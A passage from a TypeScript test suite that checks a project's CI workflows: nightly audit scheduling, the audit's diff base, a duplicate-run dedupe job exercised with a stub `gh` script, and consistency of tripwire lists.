				`hermetic.sh captures \`${name}\` but never tests it — a recorded verdict nobody reads is the same silence as no verdict`,
			).toBe(true);
		}
	});

	/**
	 * Rule 17 — THE TIME-BASED CHECKS HAVE A NIGHTLY HOME (2026-09-26).
	 *
	 * The push gate went red on pushes that changed nothing it measured: a new
	 * upstream advisory in `bun audit`, a vendored row's review window closing
	 * overnight. hermetic.sh now DEFERS those — the audit stage runs only when a push
	 * changes its inputs, and vendor_advisory_tripwire's calendar legs are dropped —
	 * and a deferral is only honest while something runs them unconditionally. That
	 * something is .github/workflows/nightly.yml; `nightlyFaults` is the judge, and
	 * the controls feed it the real files with one fault planted at a time.
	 */
	test('the time-based checks the push gate defers have a nightly home that can fail and report (rule 17)', () => {
		const hermetic = read('scripts/ci/hermetic.sh');
		const nightlyPath = join(repoRoot, '.github', 'workflows', 'nightly.yml');
		const nightly = existsSync(nightlyPath) ? readFileSync(nightlyPath, 'utf8') : null;

		// The real pair is clean — and the deferral is really there (anti-vacuity: if
		// hermetic.sh stopped deferring, the rule would pass by owing nothing).
		expect(nightlyFaults(nightly, hermetic)).toEqual([]);
		expect(hermetic).toMatch(/^bun run scripts\/ci\/audit\.ts --changed-since\b/m);
		expect(hermetic).toMatch(/^export DEDALO_VENDOR_DATED_CHECKS=0$/m);
		const real = nightly as string;

		// Controls — each planted fault must be seen.
		const plant = (
			from: string | RegExp,
			to: string,
			where: 'nightly' | 'hermetic' = 'nightly',
		) => {
			const source = where === 'nightly' ? real : hermetic;
			const mutated = source.replace(from, to);
			expect(mutated, `control did not apply: ${String(from)}`).not.toBe(source);
			return where === 'nightly' ? nightlyFaults(mutated, hermetic) : nightlyFaults(real, mutated);
		};
		expect(nightlyFaults(null, hermetic).join()).toContain('does not exist');
		expect(plant(/^ {2}schedule:\n(?: {4}.*\n)+/m, '').join()).toContain('schedule');
		expect(
			plant(/^ {2}workflow_dispatch:/m, '  pull_request:\n  workflow_dispatch:').join(),
		).toContain('`pull_request`');
		expect(
			plant(
				/^permissions:\n {2}contents: read/m,
				'permissions:\n  contents: read\n  issues: write',
			).join(),
		).toContain('TOP-LEVEL');
		expect(
			plant(
				'    permissions:\n      issues: write',
				'    permissions:\n      issues: write\n      contents: write',
			).join(),
		).toContain('only issues: write');
		expect(plant(/^ {4}if: always\(\)$/m, '').join()).toContain('always()');
		expect(
			plant(
				'      - name: Open, update or close the ci-nightly issue',
				'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - name: Open, update or close the ci-nightly issue',
			).join(),
		).toContain('checks out');
		expect(plant(/(audit\.ts --force) --require-network/, '$1').join()).toContain(
			'--require-network',
		);
		expect(plant(/(audit\.ts) --force/, '$1').join()).toContain('--force');
		expect(plant(/run: exit "\$RC"/, 'run: echo "$RC"').join()).toContain('never carried');
		expect(
			plant(/^ {8}id: audit$/m, '        id: audit\n        continue-on-error: true').join(),
		).toContain('continue-on-error');
		// The hermetic side: deferral kept, key value changed → red.
		expect(
			plant(
				/^export DEDALO_VENDOR_DATED_CHECKS=0$/m,
				'export DEDALO_VENDOR_DATED_CHECKS=1',
				'hermetic',
			).join(),
		).toContain('other than 0');
		// ...and an undeferred hermetic.sh owes no nightly at all.
		const undeferred = hermetic
			.replace(/ --changed-since "\$AUDIT_REFERENCE"/, '')
			.replace(/^export DEDALO_VENDOR_DATED_CHECKS=0$/m, '');
		expect(nightlyFaults(null, undeferred)).toEqual([]);
	});

	/**
	 * Rule 18 — THE AUDIT'S SKIP BASE IS THE WHOLE PUSH, measured by running it.
	 *
	 * The function is extracted from hermetic.sh verbatim and executed by bash in a
	 * scratch repository, with only the CI environment a push event provides. What is
	 * asserted is the OUTCOME the skip depends on — does `git diff <base>` see a
	 * lockfile change made in a non-tip commit — not how the function is spelled.
	 */
	test('the dependency audit skips only on a base that covers every pushed commit (rule 18)', () => {
		const hermetic = read('scripts/ci/hermetic.sh');
		const fn = hermetic.match(/^audit_reference\(\) \{\n[\s\S]*?^\}$/m)?.[0];
		expect(fn, 'hermetic.sh defines no audit_reference() function').toBeDefined();
		expect(hermetic).toMatch(/^AUDIT_REFERENCE="\$\(audit_reference\)" \|\| AUDIT_REFERENCE=""$/m);
		expect(hermetic).toMatch(
			/^bun run scripts\/ci\/audit\.ts --changed-since "\$AUDIT_REFERENCE"( |$)/m,
		);

		const scratch = mkdtempSync(join(tmpdir(), 'dedalo-audit-base-'));
		try {
			const git = (...args: string[]) => {
				const r = Bun.spawnSync(['git', '-C', scratch, ...args], {
					stdout: 'pipe',
					stderr: 'pipe',
				});
				expect(r.exitCode, `git ${args.join(' ')}: ${r.stderr.toString()}`).toBe(0);
				return r.stdout.toString().trim();
			};
			const commit = (file: string, body: string, message: string) => {
				writeFileSync(join(scratch, file), body);
				git('add', file);
				git('-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '--quiet', '-m', message);
				return git('rev-parse', 'HEAD');
			};
			git('init', '--quiet', '-b', 'master');
			const before = commit('README', 'a\n', 'on the remote');
			commit('bun.lock', 'bumped\n', 'push 1/3: the lockfile bump');
			commit('src.ts', 'x\n', 'push 2/3');
			const tip = commit('src.ts', 'y\n', 'push 3/3');
			expect(tip).not.toBe(before);

			const resolve = (env: Record<string, string>) => {
				// Only what this leg's event hands the tier: the CI variables of the run
				// executing THIS gate (a real push on GitHub) are unset first.
				const exports = Object.entries(env)
					.map(([k, v]) => `export ${k}='${v}'\n`)
					.join('');
				const script =
					'set -euo pipefail\n' +
					'unset GITHUB_BASE_REF CI_MERGE_REQUEST_TARGET_BRANCH_NAME DEDALO_CI_AUDIT_BASE ' +
					'GITHUB_EVENT_NAME GITHUB_EVENT_PATH CI_COMMIT_BEFORE_SHA\n' +
					`${exports}CI_REFERENCE=""\n${fn}\naudit_reference || true\n`;
				const r = Bun.spawnSync(['bash', '-c', script], {
					cwd: scratch,
					stdout: 'pipe',
					stderr: 'pipe',
				});
				return r.stdout.toString().trim();
			};
			const event = (payload: unknown) => {
				const path = join(scratch, `.event-${Math.random().toString(36).slice(2)}.json`);
				writeFileSync(path, JSON.stringify(payload));
				return { GITHUB_EVENT_NAME: 'push', GITHUB_EVENT_PATH: path };
			};
			const diffSees = (base: string) =>
				git('diff', '--name-only', base, '--').split('\n').includes('bun.lock');

			// GitHub push: the payload's `before` — and the diff from it sees the bump.
			const github = resolve(event({ before }));
			expect(github).toBe(before);
			expect(diffSees(github)).toBe(true);
			// The defect this replaced, as a control: HEAD^ hides the bump.
			expect(diffSees(git('rev-parse', 'HEAD^'))).toBe(false);
			// GitLab push and an explicit base (pre-push hook / ci:local) likewise.
			expect(resolve({ CI_COMMIT_BEFORE_SHA: before })).toBe(before);
			expect(resolve({ DEDALO_CI_AUDIT_BASE: before })).toBe(before);
			// Fail-safe: everything unconfident resolves to NOTHING — audit.ts runs.
			expect(resolve(event({ before: '0'.repeat(40) }))).toBe(''); // a new branch
			expect(resolve(event({}))).toBe(''); // no `before` in the payload
			expect(resolve({ GITHUB_EVENT_NAME: 'push' })).toBe(''); // no payload, no upstream
			expect(resolve({ DEDALO_CI_AUDIT_BASE: 'HEAD^' })).toBe(''); // not a sha
			expect(resolve({ DEDALO_CI_AUDIT_BASE: 'f'.repeat(40) })).toBe(''); // unfetchable
			// A pull request defers to the one fetched target tip; none → nothing.
			expect(resolve({ GITHUB_BASE_REF: 'master' })).toBe('');
		} finally {
			rmSync(scratch, { recursive: true, force: true });
		}
	});

	/**
	 * Rule 19 — the duplicate-run dedupe may skip only a push whose sha an earlier run
	 * on another branch already PROVED. Executed, not read: the probe step of the real
	 * file runs under bash (`-e`, GitHub's default) with a stub `gh` on PATH that serves
	 * a fixture run listing, and its GITHUB_OUTPUT is the verdict.
	 */
	test('the duplicate-run dedupe skips only a push another branch already verified (rule 19)', () => {
		const files = ['.github/workflows/ci.yml', '.github/workflows/db.yml'] as const;
		const dedupeBlocks = new Map<string, string>();
		for (const rel of files) {
			const src = read(rel);
			const jobs = jobBlocks(src);
			const dedupe = jobs.get('dedupe');
			expect(
				dedupe,
				`${rel}: no \`dedupe\` job — every push of a sha to both landing branches runs the tiers twice`,
			).toBeDefined();
			const block = (dedupe as string).trimEnd();
			dedupeBlocks.set(rel, block);
			const code = block
				.split('\n')
				.map((l) => l.trim())
				.filter((l) => l !== '' && !l.startsWith('#'));
			// Shape: least privilege, no repository code, unconditioned, blocking.
			const scopes = [...block.matchAll(/^ {6}([a-z-]+):\s*(read|write|none)\s*$/gm)].map(
				(m) => `${m[1]}: ${m[2]}`,
			);
			expect(/^ {4}permissions:\s*$/m.test(block), `${rel} dedupe: no job-level permissions`).toBe(
				true,
			);
			expect(scopes, `${rel} dedupe: holds exactly actions: read`).toEqual(['actions: read']);
			for (const [pattern, why] of [
				[
					/^(?:-\s+)?uses:/,
					'runs an action (a checkout would execute repository code with the actions token)',
				],
				[/^(?:-\s+)?if:/, 'is conditioned — a skipped dedupe skips every tier with it'],
				[/^needs:/, 'needs another job'],
				[/^(?:-\s+)?continue-on-error:/, 'tolerates its own failure'],
			] as const) {
				expect(
					code.filter((l) => pattern.test(l)),
					`${rel} dedupe ${why}`,
				).toEqual([]);
			}
			expect(block).toMatch(/^ {6}skip:\s*\$\{\{\s*steps\.probe\.outputs\.skip\s*\}\}\s*$/m);
			// Every other job waits for it (its if: is leg F's to evaluate).
			for (const [id, other] of jobs) {
				if (id === 'dedupe') continue;
				const needs = other.match(/^ {4}needs:\s*(.*)$/m)?.[1] ?? '';
				expect(
					/(^|[\s[,])dedupe([\s\],]|$)/.test(needs),
					`${rel} job '${id}' does not need dedupe — it runs on a sha another run already proved`,
				).toBe(true);
			}
			// Push runs are grouped by sha and never cancelled (the second landing branch's
			// run QUEUES, so the probe sees the first one's conclusion); PRs keep ref +
			// cancel; every other event (a dispatch) is keyed by its OWN run id — sharing
			// the sha group, a newly queued run would EVICT the pending push run, whatever
			// cancel-in-progress says.
			const prefix = rel.includes('ci.yml') ? 'ci' : 'db';
			expect(
				src,
				`${rel}: the concurrency key must be ref for a PR, sha for a push and the run id for anything else`,
			).toContain(
				`concurrency:\n  group: ${prefix}-\${{ github.event_name == 'pull_request' && github.ref || github.event_name == 'push' && github.sha || github.run_id }}\n  cancel-in-progress: \${{ github.event_name == 'pull_request' }}\n`,
			);
		}
		expect(
			dedupeBlocks.get(files[1]),
			'the dedupe job differs between ci.yml and db.yml — one decision, two copies (Actions has no anchors): change both together',
		).toBe(dedupeBlocks.get(files[0]));

		// The probe, executed. Extract the `run: |` body of the probe step, dedented.
		const block = dedupeBlocks.get(files[0]) as string;
		const lines = block.split('\n');
		const at = lines.findIndex((l) => /^ {8}run: \|\s*$/.test(l));
		expect(at, 'dedupe: the probe step has no `run: |` block').toBeGreaterThan(-1);
		const body: string[] = [];
		for (const l of lines.slice(at + 1)) {
			if (l.trim() !== '' && !l.startsWith('          ')) break;
			body.push(l.slice(10));
		}
		const script = body.join('\n');
		// The stub serves `gh api … --jq <filter>` by EMULATING the probe's projection; a
		// probe that changes its filter is red here until the stub learns it — loud, never
		// a stub silently answering a question it was not asked.
		const PROJECTION =
			'.workflow_runs[] | [.id, .head_sha, .event, .conclusion, .head_branch] | @tsv';
		expect(script, 'the probe projection changed — teach the stub below').toContain(
			`--jq '${PROJECTION}'`,
		);

		const scratch = mkdtempSync(join(tmpdir(), 'dedalo-dedupe-'));
		try {
			const bin = join(scratch, 'bin');
			Bun.spawnSync(['mkdir', '-p', bin]);
			writeFileSync(
				join(bin, 'gh'),
				[
					'#!/usr/bin/env bash',
					'echo "$*" >> "$STUB_LOG"',
					'[ -n "${STUB_FAIL:-}" ] && exit 1',
					'[ "$1" = api ] || exit 9',
					'case "$2" in',
					'  "repos/o/r/actions/runs/500") [ "$3" = --jq ] && [ "$4" = .workflow_id ] || exit 9; echo 77 ;;',
					'  "repos/o/r/actions/workflows/77/runs?head_sha=$GITHUB_SHA&"*)',
					`    [ "$3" = --jq ] && [ "$4" = '${PROJECTION}' ] || exit 9; cat "$STUB_RUNS" ;;`,
					'  *) exit 9 ;;',
					'esac',
					'',
				].join('\n'),
				{ mode: 0o755 },
			);
			const SHA = 'a'.repeat(40);
			const run = (event: string, rows: string[][], fail = false) => {
				const tag = Math.random().toString(36).slice(2);
				const out = join(scratch, `out-${tag}`);
				const log = join(scratch, `log-${tag}`);
				const runs = join(scratch, `runs-${tag}`);
				writeFileSync(out, '');
				writeFileSync(log, '');
				writeFileSync(runs, rows.map((r) => `${r.join('\t')}\n`).join(''));
				const r = Bun.spawnSync(['bash', '-e', '-c', script], {
					env: {
						PATH: `${bin}:${process.env.PATH}`,
						GITHUB_EVENT_NAME: event,
						GITHUB_REPOSITORY: 'o/r',
						GITHUB_RUN_ID: '500',
						GITHUB_SHA: SHA,
						GITHUB_REF_NAME: 'v7',
						GITHUB_OUTPUT: out,
						GH_TOKEN: 'x',
						STUB_LOG: log,
						STUB_RUNS: runs,
						...(fail ? { STUB_FAIL: '1' } : {}),
					},
					stdout: 'pipe',
					stderr: 'pipe',
				});
				expect(r.exitCode, `probe exited ${r.exitCode}: ${r.stderr.toString()}`).toBe(0);
				return { output: readFileSync(out, 'utf8'), calls: readFileSync(log, 'utf8') };
			};
			const proved = ['400', SHA, 'push', 'success', 'master'];
			const skip = (event: string, rows: string[][], fail = false) => run(event, rows, fail).output;

			// The one skip: a push run on another branch concluded success.
			expect(skip('push', [proved])).toBe('skip=true\n');
			expect(skip('push', [['450', SHA, 'push', 'failure', 'master'], proved])).toBe('skip=true\n');
			// ORDER-INDEPENDENT: runs of one sha are serialized, so whichever was admitted
			// second defers to the first's success — a higher run id included. A run-id
			// guard would make the dedupe depend on admission order (undocumented) and run
			// the tiers twice whenever GitHub admitted the higher id first.
			expect(skip('push', [['600', SHA, 'push', 'success', 'master']]), 'a later run id').toBe(
				'skip=true\n',
			);
			// Never for another event — and the API is not even asked.
			for (const event of ['pull_request', 'workflow_dispatch', 'schedule']) {
				const r = run(event, [proved]);
				expect(r.output, event).toBe('skip=false\n');
				expect(r.calls, event).toBe('');
			}
			// Never on a run that proves nothing about THIS sha from ANOTHER branch.
			for (const [why, row] of [
				['the same branch', ['400', SHA, 'push', 'success', 'v7']],
				['a red run', ['400', SHA, 'push', 'failure', 'master']],
				['a run still going', ['400', SHA, 'push', '', 'master']],
				['another sha', ['400', 'b'.repeat(40), 'push', 'success', 'master']],
				['a pull-request run', ['400', SHA, 'pull_request', 'success', 'master']],
			] as const) {
				expect(skip('push', [[...row]]), why).toBe('skip=false\n');
			}
			expect(skip('push', [])).toBe('skip=false\n');
			// Fail OPEN: an API error runs the tiers.
			expect(skip('push', [proved], true)).toBe('skip=false\n');
		} finally {
			rmSync(scratch, { recursive: true, force: true });
		}
	});

	test('hermetic.sh tripwires are a subset of verify.ts TRIPWIRES', () => {
		const verify = new Set(verifyTripwires());
		for (const t of hermeticTripwires()) {
			expect(verify.has(t), `hermetic.sh runs ${t} which verify.ts TRIPWIRES does not list`).toBe(
				true,
			);
		}
	});

	test('verify.ts TRIPWIRES equals the engineering/TRIPWIRES.md index exactly', () => {
		expect([...verifyTripwires()].sort()).toEqual([...ledgerTripwires()].sort());
	});

	// Rule 10 — the index describes what each gate ASSERTS, never how it is doing.
	test('no TRIPWIRES.md row narrates a transient red/failing state as a standing fact', () => {
		const src = read('engineering/TRIPWIRES.md');
		const rows = [...src.matchAll(/^\| (test\/[^\s|]+\.test\.ts) \|.*$/gm)].map(
			(m) => [m[1] as string, m[0] as string] as const,
		);
		// Anti-vacuity: the same grammar rule 4 parses — if it drifted, this rule
		// would otherwise scan zero rows and pass having read nothing.
		expect(
			rows.length,
			'engineering/TRIPWIRES.md: the row grammar changed and this rule is now scanning nothing',
		).toBe(ledgerTripwires().length);
		const offenders = rows.flatMap(([path, row]) =>
			findStatusProse(row).map((excerpt) => `${path}: “${excerpt}”`),
		);
		expect(
			offenders,
			'A TRIPWIRES.md row is where a RULE lives, never where its current state lives. Transient state — a gate that is not green at some moment, the files it is over on — belongs in rewrite/LEDGER.md (gitignored, not on a clone) or in the commit message of the change that opened it; narrating it in the index makes that state read as the expected condition and trains the regeneration reflex the ratchets exist to prevent. It is also never load-bearing: rule 4 parses only the first column, and scripts/verify.ts has no allowlist. Fix the gate (or take the deliberate, reviewed regression path its own message names), then DELETE the narration — keep the general rule wording around it, which is usually correct. Each line quotes the offending excerpt:\n  ' +
				offenders.join('\n  '),
		).toEqual([]);
	});

	test('every tripwire file listed anywhere actually exists', async () => {
		for (const t of new Set([
			...verifyTripwires(),
			...hermeticTripwires(),
			...dbTierTripwires(),
			...ledgerTripwires(),
		])) {
			expect(await Bun.file(join(repoRoot, t)).exists(), `${t} listed but missing on disk`).toBe(
				true,
			);
		}
	});

	test('no CI definition names DEDALO_CI_SKIP_ADVISORY — the retired desk skip stays retired', () => {
		// The key skipped db_tier.sh's unit stage while that stage could not fail its tier.
		// Since 2026-10-02 it is BLOCKING and nothing reads the key (ci_local_native §6 holds
		// the tier scripts, compose and the CLI); a host setting it again would be a stale
		// skip waiting for a reader to come back.
		const hosts = [...allWorkflows, { rel: '.gitlab-ci.yml', src: read('.gitlab-ci.yml') }];
		expect(hosts.length).toBeGreaterThan(2);
		expect(
			hosts.filter(({ src }) => src.includes('DEDALO_CI_SKIP_ADVISORY')).map(({ rel }) => rel),
		).toEqual([]);
	});

	test('no CI definition names DEDALO_CI_UNIT_RECORD_* — a runner checks the unit baseline, never writes it', () => {
		// db_tier.sh's unit stage turns into the baseline WRITER under these keys (`ci:local
		// --docker --record-unit-baseline` only; ci_local_native executes that branch). A
		// workflow setting one would rewrite the baseline it is meant to check, green.
		const hosts = [...allWorkflows, { rel: '.gitlab-ci.yml', src: read('.gitlab-ci.yml') }];
		expect(hosts.length).toBeGreaterThan(2);
		expect(
			hosts.filter(({ src }) => /DEDALO_CI_UNIT_RECORD/.test(src)).map(({ rel }) => rel),
		).toEqual([]);
		// The key the rule scans for is the one the tier reads (a rename blinds it).
		expect(read('scripts/ci/db_tier.sh')).toContain('${DEDALO_CI_UNIT_RECORD_OUT:-}');
		// Control: the scan sees a planted workflow line.
		expect(/DEDALO_CI_UNIT_RECORD/.test('env:\n  DEDALO_CI_UNIT_RECORD_OUT: /tmp\n')).toBe(true);
	});
});
